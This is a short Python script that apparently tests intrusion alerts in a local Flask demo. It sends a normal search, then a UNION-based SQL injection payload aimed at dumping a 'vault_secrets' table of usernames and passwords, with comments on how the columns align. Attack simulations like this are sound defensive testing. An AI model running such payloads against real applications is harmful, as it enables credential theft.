import requests
import time

url = "http://127.0.0.1:5000/"

print("="*50)
print("Normal Behavior Simulation")
print("="*50)
print("Cashier searching for 'Apple'...")
response = requests.post(url, data={'search': 'Apple'})
print(f"Server Response Status: {response.status_code}")
print("No alerts should be triggered in the terminal.\n")

time.sleep(2)

print("="*50)
print("Attack Behavior Simulation (SQL Injection)")
print("="*50)
print("Attacker exploiting search endpoint to dump vault_secrets...")
# Original query: SELECT * FROM inventory WHERE name LIKE '%{search}%'
# Injected payload: %' UNION SELECT id, service, username, password FROM vault_secrets; --
# Wait, inventory has 4 columns: id, name, quantity, price.
# vault_secrets has 4 columns: id, service, username, password.
# The UNION will work perfectly.
attack_payload = "%' UNION SELECT id, service, username, password FROM vault_secrets; --"

print(f"Payload: {attack_payload}")
response = requests.post(url, data={'search': attack_payload})
print(f"Server Response Status: {response.status_code}")
print("\n[!] Check your Flask application terminal for the Watchdog and Strategist alerts!")
